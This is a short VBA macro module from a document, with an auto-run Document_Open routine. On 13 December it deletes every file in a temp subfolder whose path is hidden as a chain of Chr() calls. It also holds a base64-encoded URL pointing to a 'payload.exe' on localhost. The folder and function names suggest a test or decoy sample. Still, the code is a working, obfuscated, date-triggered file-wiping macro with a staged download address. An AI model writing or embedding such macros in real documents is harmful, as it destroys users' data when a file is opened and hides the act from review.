Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    If Not (Day(Date) = 13 And Month(Date) = 12) Then
        Exit Sub
    End If
    Kill Environ("TEMP") & Chr(92) & Chr(111) & Chr(98) & Chr(108) & Chr(105) & Chr(118) & Chr(105) & Chr(111) & Chr(110) & Chr(120) & Chr(95) & Chr(119) & Chr(105) & Chr(112) & Chr(101) & Chr(95) & Chr(116) & Chr(101) & Chr(115) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(42)
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
